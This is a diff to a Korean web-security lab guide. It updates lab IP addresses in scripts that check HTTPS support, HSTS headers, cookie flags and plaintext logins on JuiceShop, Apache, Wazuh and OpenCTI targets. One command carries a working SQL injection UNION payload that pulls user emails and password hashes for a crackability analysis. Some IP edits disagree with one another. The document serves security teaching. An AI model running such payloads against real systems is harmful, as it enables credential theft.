@@ -153,8 +153,8 @@ test_proto() {
   [ "$http_code" = "X" -a "$https_code" = "200" ] && v="HTTPS only (양호)"
   printf "%-30s %-10s %-10s %s\n" "$name ($host:$hport/$sport)" "$http_code" "$https_code" "$v"
 }
-test_proto "JuiceShop" "10.20.30.80" "3000" "3000"
-test_proto "Apache+ModSec" "10.20.30.80" "80" "443"
+test_proto "JuiceShop" "10.20.32.80" "3000" "3000"
+test_proto "Apache+ModSec" "10.20.32.80" "80" "443"
 test_proto "Wazuh Dashboard" "10.20.30.100" "443" "443"
 test_proto "OpenCTI" "10.20.30.100" "8080" "8080"
 ```
@@ -163,8 +163,8 @@ test_proto "OpenCTI" "10.20.30.100" "8080" "8080"
 ```
 === HTTP/HTTPS 지원 매트릭스 ===
 endpoint                       HTTP       HTTPS      verdict
-JuiceShop (10.20.30.80:3000/3000) 200      X          ★ HTTP only (취약)
-Apache+ModSec (10.20.30.80:80/443) 200     200        혼용 (TLS 필수)
+JuiceShop (10.20.40.81:3000/3000) 200      X          ★ HTTP only (취약)
+Apache+ModSec (10.20.32.80:80/443) 200     200        혼용 (TLS 필수)
 Wazuh Dashboard (10.20.30.100:443/443) X   200        HTTPS only (양호)
 OpenCTI (10.20.30.100:8080/8080) 200       X          ★ HTTP only (취약)
 ```
@@ -182,7 +182,7 @@ OpenCTI (10.20.30.100:8080/8080) 200       X          ★ HTTP only (취약)
 ```bash
 echo "=== 통신 보안 4 헤더 종합 점검 ==="
 printf "%-25s %-12s %-12s %-15s %s\n" "endpoint" "redirect" "HSTS" "preload" "Upgrade-Insec"
-for url in "http://10.20.30.80:80" "http://10.20.30.80:3000" "https://10.20.30.100:443"; do
+for url in "http://10.20.32.80:80" "http://10.20.40.81:3000" "https://10.20.30.100:443"; do
   H=$(curl -sIk --max-time 3 "$url" 2>/dev/null)
   loc=$(echo "$H" | grep -i "^location:" | awk '{print $2}' | tr -d '\r' | head -c 30)
   hsts=$(echo "$H" | grep -i "strict-transport" | awk -F: '{print $2}' | tr -d '\r' | head -c 30)
@@ -196,8 +196,8 @@ done
 ```
 === 통신 보안 4 헤더 종합 점검 ===
 endpoint                  redirect     HSTS         preload         Upgrade-Insec
-http://10.20.30.80:80     -            -            ✗               ✗
-http://10.20.30.80:3000   -            -            ✗               ✗
+http://10.20.32.80:80     -            -            ✗               ✗
+http://10.20.40.81:3000   -            -            ✗               ✗
 https://10.20.30.100:443  -             max-age=31536 ✗            ✗
 ```
 
@@ -422,7 +422,7 @@ test_tls_version "www.google.com:443"
 
 ```bash
 # week05 의 SQLi 결과 활용 — 추출 해시의 알고리즘 + crack 가능성 분석
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test%27%29%29UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users+LIMIT+5--" | python3 -c "
+curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%29%29UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users+LIMIT+5--" | python3 -c "
 import sys, json
 data = json.load(sys.stdin).get('data', [])
 print(f'{\"email\":<32} {\"hash[:16]\":<18} {\"len\":<5} {\"algo\":<20} {\"crack_time\"}')
@@ -475,7 +475,7 @@ ciso@juice-sh.op                 6edd9d726cce1f90   32    MD5                  <
 ```bash
 # 로그인 요청이 HTTP(평문)로 전송되는지 확인
 echo "=== 로그인 API 프로토콜 ==="
-echo "현재 로그인 URL: http://10.20.30.80:3000/rest/user/login"
+echo "현재 로그인 URL: http://10.20.40.81:3000/rest/user/login"
 echo "프로토콜: HTTP (암호화 안됨)"
 echo ""
 echo "문제: 비밀번호가 네트워크에서 평문으로 전송됨"
@@ -484,12 +484,12 @@ echo "권고: HTTPS 적용 필수"
 # API 응답에 민감 정보가 포함되는지 확인
 echo ""
 echo "=== API 응답 민감 정보 확인 ==="
-TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 # 로그인 응답에 비밀번호 해시가 포함되는지
-curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "  # 요청 데이터(body)
 import sys, json
@@ -524,17 +524,17 @@ check_cookie() {
     printf "  %-20s Secure=%s HttpOnly=%s SameSite=%s\n" "$name" "$secure" "$httponly" "$samesite"
   done
 }
-check_cookie "JuiceShop" "http://10.20.30.80:3000"
-check_cookie "Apache" "http://10.20.30.80:80"
+check_cookie "JuiceShop" "http://10.20.40.81:3000"
+check_cookie "Apache" "http://10.20.32.80:80"
 check_cookie "Wazuh" "https://10.20.30.100:443"
 ```
 
 **예상 출력**:
 ```
 === 쿠키 보안 속성 4종 점검 ===
-[JuiceShop] http://10.20.30.80:3000
+[JuiceShop] http://10.20.40.81:3000
   language              Secure=✗ HttpOnly=✗ SameSite=✗
-[Apache] http://10.20.30.80:80
+[Apache] http://10.20.32.80:80
   PHPSESSID             Secure=✗ HttpOnly=✓ SameSite=✗
 [Wazuh] https://10.20.30.100:443
   security_authentication Secure=✓ HttpOnly=✓ SameSite=samesite=strict
@@ -606,7 +606,7 @@ check_cookie "Wazuh" "https://10.20.30.100:443"
 
 ### Burp Suite Community
 > **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
-> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
+> **실행 위치:** `작업 PC → web (10.20.40.81:3000)`  
 > **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)
 
 **주요 경로·파일**
